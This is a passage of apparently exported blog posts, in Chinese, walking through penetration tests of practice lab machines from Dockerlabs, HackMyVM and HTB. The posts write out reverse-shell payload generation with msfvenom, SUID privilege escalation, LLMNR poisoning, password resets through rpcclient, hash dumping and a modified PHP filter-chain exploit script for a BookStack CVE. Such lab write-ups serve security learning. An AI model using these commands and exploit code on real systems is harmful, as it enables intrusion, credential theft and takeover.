burp.txt -p username -D crackofftrue_db -T users --dump 由于是时间盲注，得多等一会\n用hydra爆破吧，一个一个试有点费时间\nrosa:ultramegaverypasswordhack User #\r在**/var/www/alice_note**中得到一串字符\n并且内部开有8080端口\nSSH端口转发\n[root@kali] ~kali/Desktop ❯ ssh rosa@172.17.0.2 -L 8080:127.0.0.1:8080 然后使用MSF模块进行登录爆破\n得到正确的登录密码\n[+] 127.0.0.1:8080 - Login Successful: tomitoma:supersecurepasswordultra 接下来上传war包进行Getshell\n这里使用的是msfvenom生成的webshell\n[root@kali] /home/kali/crackoff ❯ msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.17.0.1 LPOST=4444 -f war -o shell.war ⏎\rPayload size: 1106 bytes\rFinal size of war file: 1106 bytes\rSaved as: shell.war 部署后访问\n成功得到反弹shell\n进入**/opt/tomcat得到mario**的密码\nmario:marioeseljefe 登录后拿到user.txt\nRoot #\r查看tomcat的特殊命令\nsudo -l\rMatching Defaults entries for tomcat on 157676472df8:\renv_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty\rUser tomcat may run the following commands on 157676472df8:\r(ALL) NOPASSWD: /opt/tomcat/bin/catalina.sh 直接写入提权部分\necho \u0026#34;chmod u+s /bin/bash\u0026#34; \u0026gt;\u0026gt; /opt/tomcat/bin/catalina.sh\rsudo /opt/tomcat/bin/catalina.sh start Summary #\rUser：SQL时间盲注得到登录账户列表，用hydra进行快速爆破。内部存在tomcat服务，同样进行爆破尝试，上传木马反弹shell。可以参考下面这个链接，我尝试使用**/usr/share/webshells/jsp/cmdjsp.jsp进行转化为war文件，但是无法命令执行？？？无奈使用msfveom**成功反弹。\n【Vulfocus靶场-初级】Tomcat后台弱口令+War包文件上传Getshell漏洞复现_tomcat上传war包-CSDN博客 Root：直接写入**/opt/tomcat/bin/catalina.sh**，以root的身份执行即可。\n感觉这个机器奇奇怪怪的。。\n","date":"2025-03-01","externalUrl":null,"permalink":"/posts/2025/03/dockerlabs-crackoff/","section":"Posts","summary":"","title":"Dockerlabs-Crackoff","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Hard Nmap #\r[root@kali] /home/kali/r00tless ❯ nmap 172.18.0.2 -sV -A -p-\rStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-01 11:27 CST\rNmap scan report for 172.18.0.2\rHost is up (0.000092s latency).\rNot shown: 65531 closed tcp ports (reset)\rPORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)\r| ssh-hostkey: | 256 fa:7b:d3:96:f6:83:bb:bd:24:86:b4:a8:f6:59:c3:62 (ECDSA)\r|_ 256 29:49:38:ae:44:75:d8:88:2a:b6:98:55:00:bd:24:76 (ED25519)\r80/tcp open http Apache httpd 2.4.58 ((Ubuntu))\r|_http-server-header: Apache/2.4.58 (Ubuntu)\r|_http-title: Subir Archivo\r139/tcp open netbios-ssn Samba smbd 4.6.2\r445/tcp open netbios-ssn Samba smbd 4.6.2\rMAC Address: 02:42:AC:12:00:02 (Unknown)\rDevice type: general purpose\rRunning: Linux 4.X|5.X\rOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\rOS details: Linux 4.15 - 5.8\rNetwork Distance: 1 hop\rService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\rHost script results:\r| smb2-security-mode: | 3:1:1: |_ Message signing enabled but not required\r| smb2-time: | date: 2025-03-01T03:27:48\r|_ start_date: N/A\rTRACEROUTE\rHOP RTT ADDRESS\r1 0.09 ms 172.18.0.2\rOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\rNmap done: 1 IP address (1 host up) scanned in 20.77 seconds Gobuster #\r[root@kali] /home/kali/r00tless ❯ gobuster dir -u http://172.18.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html\r===============================================================\rGobuster v3.6\rby OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart)\r===============================================================\r[+] Url: http://172.18.0.2\r[+] Method: GET\r[+] Threads: 10\r[+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\r[+] Negative Status codes: 404\r[+] User Agent: gobuster/3.6\r[+] Extensions: php,txt,html\r[+] Timeout: 10s\r===============================================================\rStarting gobuster in directory enumeration mode\r===============================================================\r/.html (Status: 403) [Size: 275]\r/index.html (Status: 200) [Size: 2410]\r/.php (Status: 403) [Size: 275]\r/upload.php (Status: 200) [Size: 56]\r/readme.txt (Status: 200) [Size: 78]\r/.php (Status: 403) [Size: 275]\r/.html (Status: 403) [Size: 275]\r/server-status (Status: 403) [Size: 275]\rProgress: 882240 / 882244 (100.00%)\r===============================================================\rFinished\r=============================================================== Own passsamba #\r看来文件上传到了**.ssh/**目录下，那么具体是谁的呢？\n大概就是passsamba\n因此将密钥上传上去就行了\n[root@kali] /home/kali/r00tless ❯ cat ~/.ssh/id_rsa.pub \u0026gt;\u0026gt; authorized_keys 把authorized_keys上传然后ssh登录\nOwn root-false #\rpasssamba@9c7c24cafe54:~$ ls\rnote.txt\rpasssamba@9c7c24cafe54:~$ cat note.txt What would \u0026#34;sambaarribasiempre\u0026#34; be used for? 或许是某个用户的smb密码呢？\n得到一个secret.zip，但是需要密码\n使用zip2john配合john爆破\n[root@kali] /home/kali/r00tless ❯ zip2john secret.zip \u0026gt;\u0026gt; zip.hash\r[root@kali] /home/kali/r00tless ❯ john zip.hash /usr/share/wordlists/rockyou.txt [root@kali] /home/kali/r00tless ❯ cat secret.txt root-false:cGFzc3dvcmRiYWRzZWN1cmV1bHRyYQ== base64解密一下：passwordbadsecureultra\nOwn less #\rroot-false@9c7c24cafe54:~$ cat message.txt Mario, remember this word, then the boss will get angry:\r\u0026#34;pinguinodemarioelmejor\u0026#34; 由于存在第二个网站，这里无法直接进去\n在apache的配置文件中发现内网IP\n尝试curl访问，看来是一个表单，需要登录\n这里使用chisel进行代理\n可以直接访问了，由于之前得到了一个密码字符串\nmario:pinguinodemarioelmejor 登录成功，得到一个txt文件\n是一段很长的文本，检索下划线\nless:Cristal_de_la_Aurora Root #\rless@9c7c24cafe54:~$ sudo -l\rMatching Defaults entries for less on 9c7c24cafe54:\renv_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty\rUser less may run the following commands on 9c7c24cafe54:\r(ALL : ALL) NOPASSWD: /bin/chown chown | GTFOBins 可以直接改变**/root**目录的所有者为当前用户\n如果想要提升权限，可以修改**/etc/passwd**\n比如说新增一个用户，让他和root在同一个组里面\nSummary #\rUser：上传密钥文件到**/.ssh/目录，通过enum4linux泄露出用户名，ssh登录后拿到smb**的登录密码，爆破压缩包获取到密码，访问内网的第二个网站，登录后拿到了最终的密码。\nRoot：使用chown改变**/root/目录的所有者为当前用户，即可进入。我尝试了手动添加authorized_keys**，但是似乎文件拥有者不是登录对象的话，会导致ssh认证失败，因此写入密钥的方式就没法完成了。不过可以写入**/etc/passwd的方式新增root**组用户来提权。\n","date":"2025-03-01","externalUrl":null,"permalink":"/posts/2025/03/dockerlabs-r00tless/","section":"Posts","summary":"","title":"Dockerlabs-r00tless","type":"posts"},{"content":"\rBox Info #\rOS Windows Difficulty Medium Nmap #\r[root@kali] /home/kali/Desktop ❯ nmap 192.168.56.103 -sSV -Pn -A -T4\rPORT STATE SERVICE VERSION\r53/tcp open domain?\r88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2025-03-02 03:01:34Z)\r135/tcp open msrpc Microsoft Windows RPC\r139/tcp open netbios-ssn Microsoft Windows netbios-ssn\r389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)\r445/tcp open microsoft-ds?\r464/tcp open kpasswd5?\r593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0\r636/tcp open tcpwrapped\r3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)\r3269/tcp open tcpwrapped\rMAC Address: 08:00:27:46:72:D1 (Oracle VirtualBox virtual NIC)\rWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\rDevice type: general purpose\rRunning (JUST GUESSING): Microsoft Windows 2022|11|2016 (97%)\rOS CPE: cpe:/o:microsoft:windows_server_2016\rAggressive OS guesses: Microsoft Windows Server 2022 (97%), Microsoft Windows 11 21H2 (91%), Microsoft Windows Server 2016 (91%)\rNo exact OS matches for host (test conditions non-ideal).\rNetwork Distance: 1 hop\rService Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows\rHost script results:\r| smb2-security-mode: | 3:1:1: |_ Message signing enabled and required\r|_clock-skew: 14h59m36s\r| smb2-time: | date: 2025-03-02T03:03:53\r|_ start_date: N/A\r|_nbstat: NetBIOS name: DC01, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: 08:00:27:46:72:d1 (Oracle VirtualBox virtual NIC) 把DC01.SOUPEDECODE.LOCAL添加到**/etc/hosts**\nLLMNR \u0026amp; NBT-NS #\r我尝试直接枚举靶机上的信息，没有成功。\n在做sherlocks的时候遇到过这个问题：Sherlocks-Reaper - HYH\n这里是涉及到的一些文章\n渗透测试之 Responder 工具详解 中间人攻击 LLMNR链路本地多播名称解析 NBNS 网络基本输出系统名称服务 NTLM Relay攻击利用工具一篇文章让你明明白白_responder工具-CSDN博客\n【内网学习笔记】18、LLMNR 和 NetBIOS 欺骗攻击 | TeamsSix\n要说明的是，这个攻击不需要凭证，但是是有前提的\n无有效的 DNS: 当网络中缺乏有效的 DNS 服务器时，设备会尝试使用 LLMNR 或 NBT-NS 进行名称解析。这种情况下，攻击者可以更容易地利用这些协议进行攻击。\n启用的 LLMNR 和 NBT-NS: 目标主机必须启用 LLMNR 和 NBT-NS 服务。在许多 Windows 系统中，这些服务默认是启用的。\n同一广播域内: 攻击者和目标设备需要处于同一广播域内。LLMNR 和 NBT-NS 是基于广播的协议，因此攻击者需要能够接收到这些广播请求。\n[root@kali] /home/kali/Desktop ❯ responder -I eth0 成功接收到NTLM哈希值，直接使用john爆破\n[root@kali] /home/kali/DC03 ❯ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt Using default input encoding: UTF-8\rLoaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])\rWill run 4 OpenMP threads\rPress \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status\rjesuschrist (xkate578) 1g 0:00:00:00 DONE (2025-03-01 20:28) 100.0g/s 204800p/s 204800c/s 204800C/s 123456..lovers1\rUse the \u0026#34;--show --format=netntlmv2\u0026#34; options to display all of the cracked passwords reliably\rSession completed. SMBmap #\r进入到share目录，拿到user.txt\nldapdomaindump #\rLDAPDomainDump是一款利用LDAP协议收集活动目录信息的工具\n[root@kali] /home/kali/DC03 ❯ ldapdomaindump -u \u0026#34;SOUPEDECODE.LOCAL\\xkate578\u0026#34; -p jesuschrist 192.168.56.103 ⏎\r[*] Connecting to host...\r[*] Binding to host\r[+] Bind OK\r[*] Starting domain dump\r[+] Domain dump finished 然后使用python.http.server即可查看到html文件\n可以看到Operators属于Domain Admins组\n而我们的用户属于Account Operators组\n还有一个用户属于Operator组\n因此目前要做的是，通过当前的xkate578用户去修改fbeth103的密码\n[root@kali] /home/kali/DC03 ❯ rpcclient -U \u0026#34;xkate578\u0026#34; --password=\u0026#34;jesuschrist\u0026#34; 192.168.56.126 ⏎\rrpcclient $\u0026gt; setuserinfo2 fbeth103 23 \u0026#34;Pass1234!\u0026#34;\rrpcclient $\u0026gt; Secretdump #\r改好之后尝试获取域内的哈希，注意不是本地的！\n[root@kali] /home/kali/DC03 ❯ impacket-secretsdump \u0026#39;SOUPEDECODE.LOCAL/fbeth103:Pass1234!\u0026#39;@192.168.56.126 Summary #\rUser：LLMNR 中毒攻击获取到xkate578的Net-NTLM Hash，并且在smb服务中拿到user.txt。这还是我第一次在渗透中使用LLMNR，之前还是在日志分析的时候了解的。\nRoot：通过ldap端口进行信息收集，这里我本想用的是bloodhound，但是老是报错。发现当前用户可以修改高权限组的成员密码，修改后dumphash，最后Evil-winrm登录。\n其中重置了一下靶机，因此IP变化了。\n","date":"2025-03-01","externalUrl":null,"permalink":"/posts/2025/03/hackmyvm-dc03/","section":"Posts","summary":"","title":"HackMyVM-DC03","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Medium Nmap #\r[root@kali] /home/kali/Inclusion ❯ nmap 172.17.0.2 -sV -A -p-\rStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-28 20:33 CST\rNmap scan report for sitio.dl (172.17.0.2)\rHost is up (0.000081s latency).\rNot shown: 65533 closed tcp ports (reset)\rPORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)\r| ssh-hostkey: | 256 03:cf:72:54:de:54:ae:cd:2a:16:58:6b:8a:f5:52:dc (ECDSA)\r|_ 256 13:bb:c2:12:f5:97:30:a1:49:c7:f9:d0:ba:d0:5e:f7 (ED25519)\r80/tcp open http Apache httpd 2.4.57 ((Debian))\r|_http-server-header: Apache/2.4.57 (Debian)\r|_http-title: Apache2 Debian Default Page: It works\rMAC Address: 02:42:AC:11:00:02 (Unknown)\rDevice type: general purpose\rRunning: Linux 4.X|5.X\rOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\rOS details: Linux 4.15 - 5.8\rNetwork Distance: 1 hop\rService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\rTRACEROUTE\rHOP RTT ADDRESS\r1 0.08 ms sitio.dl (172.17.0.2)\rOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\rNmap done: 1 IP address (1 host up) scanned in 8.70 seconds Gobuster #\r[root@kali] /home/kali/Inclusion ❯ gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php\r===============================================================\rGobuster v3.6\rby OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart)\r===============================================================\r[+] Url: http://172.17.0.2\r[+] Method: GET\r[+] Threads: 10\r[+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\r[+] Negative Status codes: 404\r[+] User Agent: gobuster/3.6\r[+] Extensions: php\r[+] Timeout: 10s\r===============================================================\rStarting gobuster in directory enumeration mode\r===============================================================\r/.php (Status: 403) [Size: 275]\r/shop (Status: 301) [Size: 307] [--\u0026gt; http://172.17.0.2/shop/]\r/.php (Status: 403) [Size: 275]\r/server-status (Status: 403) [Size: 275]\rProgress: 441120 / 441122 (100.00%)\r===============================================================\rFinished\r=============================================================== 再扫**/shop**\n[root@kali] /home/kali/Inclusion ❯ gobuster dir -u http://172.17.0.2/shop -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php\r===============================================================\rGobuster v3.6\rby OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart)\r===============================================================\r[+] Url: http://172.17.0.2/shop\r[+] Method: GET\r[+] Threads: 10\r[+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\r[+] Negative Status codes: 404\r[+] User Agent: gobuster/3.6\r[+] Extensions: php\r[+] Timeout: 10s\r===============================================================\rStarting gobuster in directory enumeration mode\r===============================================================\r/.php (Status: 403) [Size: 275]\r/index.php (Status: 200) [Size: 1112]\r/.php (Status: 403) [Size: 275]\rProgress: 441120 / 441122 (100.00%)\r===============================================================\rFinished\r=============================================================== LFI #\r进入index.php查看\n源码中报错了一个GET参数\n尝试读取文件\n[root@kali] /home/kali/Inclusion ❯ ffuf -u \u0026#34;http://172.17.0.2/shop/index.php?archivo=FUZZ\u0026#34; -w ../Desktop/LFI-payload.txt -fl 45 成功读取到**/etc/passwd**\n看到存在manchi和seller两个用户，无法读取ssh密钥\n我尝试了读取日志文件以及其他的配置文件，都失败了\nHydra #\r这真的是我最不喜欢的方式😔\n得到密码是lovely\nRoot #\r由于没有特殊的命令，这里需要上传文件来进行查找\n但是没有任何可以下载的命令，curl、wget都没有\n因为我们是通过ssh登录的，因此可以使用scp来上传文件\nlinpeas和pspy我都上传过了，没有找到有价值的东西，因此上传suforce进行破解密码\n破解得到密码：qwerty\n查看seller的特殊权限命令\nseller@0c86b8078585:/tmp$ sudo -l\rMatching Defaults entries for seller on 0c86b8078585:\renv_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_pty\rUser seller may run the following commands on 0c86b8078585:\r(ALL) NOPASSWD: /usr/bin/php 特殊命令是php，那就好弄了\nphp | GTFOBins Summary #\rUser：LFI读取**/etc/passwd获取到用户名，但是其他有价值的东西读不到，只能ssh**爆破。\nRoot：同样suForce爆破密码，通过php命令行提权。\n我真的很不喜欢这种爆破流渗透方式，让这个靶机都失去了乐趣😡\n","date":"2025-02-28","externalUrl":null,"permalink":"/posts/2025/02/dockerlabs-inclusion/","section":"Posts","summary":"","title":"Dockerlabs-Inclusion","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Medium Nmap #\r[root@kali] /home/kali/sites ❯ nmap 172.17.0.2 -sV -A -p-\rStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-28 20:05 CST\rNmap scan report for 172.17.0.2\rHost is up (0.000077s latency).\rNot shown: 65533 closed tcp ports (reset)\rPORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)\r| ssh-hostkey: | 256 cb:8f:50:db:6d:d8:d4:ac:bf:54:b0:62:12:7c:f0:01 (ECDSA)\r|_ 256 ca:6b:c7:0c:2a:d6:0e:3e:ff:c4:6e:61:ac:35:db:01 (ED25519)\r80/tcp open http Apache httpd 2.4.58 ((Ubuntu))\r|_http-server-header: Apache/2.4.58 (Ubuntu)\r|_http-title: Configuraci\\xC3\\xB3n de Apache y Seguridad en Sitios Web\rMAC Address: 02:42:AC:11:00:02 (Unknown)\rDevice type: general purpose\rRunning: Linux 4.X|5.X\rOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\rOS details: Linux 4.15 - 5.8\rNetwork Distance: 1 hop\rService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\rTRACEROUTE\rHOP RTT ADDRESS\r1 0.08 ms 172.17.0.2\rOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\rNmap done: 1 IP address (1 host up) scanned in 10.63 seconds Gobuster #\r[root@kali] /home/kali/sites ❯ gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php ⏎\r===============================================================\rGobuster v3.6\rby OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart)\r===============================================================\r[+] Url: http://172.17.0.2\r[+] Method: GET\r[+] Threads: 10\r[+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\r[+] Negative Status codes: 404\r[+] User Agent: gobuster/3.6\r[+] Extensions: php\r[+] Timeout: 10s\r===============================================================\rStarting gobuster in directory enumeration mode\r===============================================================\r/.php (Status: 403) [Size: 275]\r/.php (Status: 403) [Size: 275]\r/vulnerable.php (Status: 200) [Size: 37]\r/server-status (Status: 403) [Size: 275]\rProgress: 441120 / 441122 (100.00%)\r===============================================================\rFinished\r=============================================================== ReadAnyFiles #\r需要提供一个page参数或者username参数，这里尝试读取**/etc/passwd**\n看到存在chocolate用户，无法直接读取ssh密钥\n由于在页面中发现了这个conf文件\n尝试读取\n[root@kali] /home/kali/sites ❯ curl --path-as-is \u0026#39;http://172.17.0.2/vulnerable.php?page=/etc/apache2/sites-available/sitio.conf\u0026#39; \u0026lt;VirtualHost *:80\u0026gt;\rServerAdmin webmaster@tusitio.com\rDocumentRoot /var/www/html\rServerName sitio.dl\rServerAlias www.sitio.dl\r\u0026lt;Directory /var/www/html\u0026gt;\rOptions Indexes FollowSymLinks\rAllowOverride All\rRequire all granted\r\u0026lt;/Directory\u0026gt;\r# Bloquear acceso al archivo archivitotraviesito (cuidadito cuidadin con este regalin)\r# \u0026lt;Files \u0026#34;archivitotraviesito\u0026#34;\u0026gt;\r# Require all denied\r# \u0026lt;/Files\u0026gt;\rErrorLog ${APACHE_LOG_DIR}/error.log\rCustomLog ${APACHE_LOG_DIR}/access.log combined\r\u0026lt;/VirtualHost\u0026gt; 哎，看不懂，拿给翻译\n注释说明要阻止对名为 archivitotraviesito 的文件的访问。相关配置被注释掉了，未生效。\n尝试访问 http://172.17.0.2/archivitotraviesito\n得到登录密码\nRoot #\r查看特殊权限命令\nchocolate@805cedff7533:~$ sudo -l\rMatching Defaults entries for chocolate on 805cedff7533:\renv_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty\rUser chocolate may run the following commands on 805cedff7533:\r(ALL) NOPASSWD: /usr/bin/sed 在GTFObins中有记录，可以直接用\nsed | GTFOBins Summary #\r感觉这个不像是一个Medium的靶机。。。\nUser：任意文件读取，可以看到apache的配置文件的注释中有一个隐藏的路由，访问得到ssh密码。\nRoot：查GTFO直接提权，没啥好说的。\n","date":"2025-02-28","externalUrl":null,"permalink":"/posts/2025/02/dockerlabs-sites/","section":"Posts","summary":"","title":"Dockerlabs-Sites","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Hard Nmap #\r[root@kali] /home/kali/Checker ❯ nmap checker.htb -sV PORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)\r80/tcp open http Apache httpd\r8080/tcp open http Apache httpd\rService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel 在checker.htb:8080页面上发现了一个子域名：vault\nCVE-2023-1545 #\r关注到8080端口上开放的是Teampass服务\n搜索到了一个SQL注入的CVE漏洞\nSQL Injection in nilsteampassnet/teampass | CVE-2023-1545 | Snyk [root@kali] /home/kali/Checker ❯ ./poc.sh http://checker.htb:8080/ ⏎\rThere are 2 users in the system:\radmin: $2y$10$lKCae0EIUNj6f96ZnLqnC.LbWqrBQCT1LuHEFht6PmE4yH75rpWya\rbob: $2y$10$yMypIj1keU.VAqBI692f..XXn0vfyBL7C1EhOs35G59NxmtpJ/tiy 使用john进行破解得到bob的密码\nbob:cheerleader 可以直接登录到后台\n拿到bob的密码，可以返回到80端口上登录\n尝试登录reader的账户：hiccup-publicly-genesis\n发现需要验证码，因此无法直接登录\nCVE-2023-6199 #\r登录bookstack页面，在源代码中找到版本信息：23.10.2\n搜索得到一个可能存在的漏洞\nLFR via SSRF in BookStack | Blog | Fluid Attacks 根据文中操作，会发现报错，不能直接使用\n再看看文章发现需要修改文件内容才行\n需要修改的是**/php_filter_chains_oracle_exploit/filters_chain_oracle/core里的requestor.py**，把payload插入到img标签中，就像下文中的一样所提及的一样。\nBook Stack v23.10.2 - LFR via Blind SSRF | Advisories | Fluid Attacks 这是修改过的requestor.py\n或者也可以通过Github的这个fork\npwnter/php_filter_chains_oracle_exploit: A CLI to exploit parameters vulnerable to PHP filter chain error based oracle. import json\rimport requests\rimport time\rfrom filters_chain_oracle.core.verb import Verb\rfrom filters_chain_oracle.core.utils import merge_dicts\rimport re\r\u0026#34;\u0026#34;\u0026#34;\rClass Requestor, defines all the request logic.\r\u0026#34;\u0026#34;\u0026#34;\rclass Requestor:\rdef __init__(self, file_to_leak, target, parameter, data=\u0026#34;{}\u0026#34;, headers=\u0026#34;{}\u0026#34;, verb=Verb.POST, in_chain=\u0026#34;\u0026#34;,\rproxy=None, time_based_attack=False, delay=0.0, json_input=False, match=False):\rself.file_to_leak = file_to_leak\rself.target = target\rself.parameter = parameter\rself.headers = headers\rself.verb = verb\rself.json_input = json_input\rself.match = match\rprint(\u0026#34;[*] The following URL is targeted : {}\u0026#34;.format(self.target))\rprint(\u0026#34;[*] The following local file is leaked : {}\u0026#34;.format(self.file_to_leak))\rprint(\u0026#34;[*] Running {} requests\u0026#34;.format(self.verb.name))\rif data != \u0026#34;{}\u0026#34;:\rprint(\u0026#34;[*] Additionnal data used : {}\u0026#34;.format(data))\rif headers != \u0026#34;{}\u0026#34;:\rprint(\u0026#34;[*] Additionnal headers used : {}\u0026#34;.format(headers))\rif in_chain != \u0026#34;\u0026#34;:\rprint(\u0026#34;[*] The following chain will be in each request : {}\u0026#34;.format(in_chain))\rin_chain = \u0026#34;|convert.iconv.{}\u0026#34;.format(in_chain)\rif match:\rprint(\u0026#34;[*] The following pattern will be matched for the oracle : {}\u0026#34;.format(match))\rself.in_chain = in_chain\rself.data = json.loads(data)\rself.headers = json.loads(headers)\rself.delay = float(delay)\rif proxy:\rself.proxies = {\r\u0026#39;http\u0026#39;: f\u0026#39;{proxy}\u0026#39;,\r\u0026#39;https\u0026#39;: f\u0026#39;{proxy}\u0026#39;,\r}\relse:\rself.proxies = None\rself.instantiate_session()\rif time_based_attack:\rself.time_based_attack = self.error_handling_duration()\rprint(\u0026#34;[+] Error handling duration : {}\u0026#34;.format(self.time_based_attack))\relse:\rself.time_based_attack = False\r\u0026#34;\u0026#34;\u0026#34;\rInstantiates a requests session for optimization\r\u0026#34;\u0026#34;\u0026#34;\rdef instantiate_session(self):\rself.session = requests.Session()\rself.session.headers.update(self.headers)\rself.session.proxies = self.proxies\rself.session.verify = False\rdef join(self, *x):\rreturn \u0026#39;|\u0026#39;.join(x)\r\u0026#34;\u0026#34;\u0026#34;\rUsed to see how much time a 500 error takes to calibrate the timing attack\r\u0026#34;\u0026#34;\u0026#34;\rdef error_handling_duration(self):\rchain = \u0026#34;convert.base64-encode\u0026#34;\rrequ = self.req_with_response(chain)\rself.normal_response_time = requ.elapsed.total_seconds()\rself.blow_up_utf32 = \u0026#39;convert.iconv.L1.UCS-4\u0026#39;\rself.blow_up_inf = self.join(*[self.blow_up_utf32] * 15)\rchain_triggering_error = f\u0026#34;convert.base64-encode|{self.blow_up_inf}\u0026#34;\rrequ = self.req_with_response(chain_triggering_error)\rreturn requ.elapsed.total_seconds() - self.normal_response_time\r\u0026#34;\u0026#34;\u0026#34;\rUsed to parse the option parameter sent by the user\r\u0026#34;\u0026#34;\u0026#34;\rdef parse_parameter(self, filter_chain):\rdata = {}\rif \u0026#39;[\u0026#39; and \u0026#39;]\u0026#39; in self.parameter: # Parse array elements\rmain_parameter = [re.search(r\u0026#39;^(.*?)\\[\u0026#39;, self.parameter).group(1)]\rsub_parameters = re.findall(r\u0026#39;\\[(.*?)\\]\u0026#39;, self.parameter)\rall_params = main_parameter + sub_parameters\rjson_object = {}\rtemp = json_object\rfor i, element in enumerate(all_params):\rif i == len(all_params) - 1:\rtemp[element] = filter_chain\relse:\rtemp[element] = {}\rtemp = temp[element]\rdata = json_object\relse:\rdata[self.parameter] = filter_chain\rreturn merge_dicts(data, self.data)\r\u0026#34;\u0026#34;\u0026#34;\rReturns the response of a request defined with all options\r\u0026#34;\u0026#34;\u0026#34;\rdef req_with_response(self, s):\rif self.delay \u0026gt; 0:\rtime.sleep(self.delay)\rfilter_chain = f\u0026#39;php://filter/{s}{self.in_chain}/resource={self.file_to_leak}\u0026#39;\r# DEBUG print(filter_chain)\rmerged_data = self.parse_parameter(filter_chain)\r####Add ↓\rimport base64\rinsert_base64 = base64.b64encode(filter_chain.encode(\u0026#39;utf-8\u0026#39;)).decode(\u0026#39;utf-8\u0026#39;)\rpayload = f\u0026#34;\u0026lt;img src=\u0026#39;data:image/png;base64,{insert_base64}\u0026#39;/\u0026gt;\u0026#34;\rmerged_data[self.parameter] = payload # Fixed indentation\r#####Add ↑\r# Make the request, the verb and data encoding is defined\rtry:\rif self.verb == Verb.GET:\rrequ = self.session.get(self.target, params=merged_data)\rreturn requ\relif self.verb == Verb.PUT:\rif self.json_input:\rrequ = self.session.put(self.target, json=merged_data)\relse:\rrequ = self.session.put(self.target, data=merged_data)\rreturn requ\relif self.verb == Verb.DELETE:\rif self.json_input:\rrequ = self.session.delete(self.target, json=merged_data)\relse:\rrequ = self.session.delete(self.target, data=merged_data)\rreturn requ\relif self.verb == Verb.POST:\rif self.json_input:\rrequ = self.session.post(self.target, json=merged_data)\relse:\rrequ = self.session.post(self.target, data=merged_data)\rreturn requ\rexcept requests.exceptions.ConnectionError:\rprint(\u0026#34;[-] Could not instantiate a connection\u0026#34;)\rexit(1)\rreturn None\r\u0026#34;\u0026#34;\u0026#34;\rUsed to determine if the answer trigged the error based oracle\rTODO : increase the efficiency of the time based oracle\r\u0026#34;\u0026#34;\u0026#34;\rdef error_oracle(self, s):\rrequ = self.req_with_response(s)\rif self.match:\r# DEBUG print(\u0026#34;PATT\u0026#34;, (self.match in requ.text))\rreturn self.match in requ.text\rif self.time_based_attack:\r# DEBUG print(\u0026#34;ELAP\u0026#34;, requ.elapsed.total_seconds() \u0026gt; ((self.time_based_attack/2)+0.01))\rreturn requ.elapsed.total_seconds() \u0026gt; ((self.time_based_attack / 2) + 0.01)\r# DEBUG print(\u0026#34;CODE\u0026#34;, requ.status_code == 500)\rreturn requ.status_code == 500 Google Auth #\r由于之前ssh登录需要验证码，经过搜索我得到了他的路径\ngoogle/google-authenticator-libpam 在浏览Bookstack里面书籍的时候，发现了一个可能存在的路径\n脚本的解释是：将 /home 目录的所有内容递归地复制到 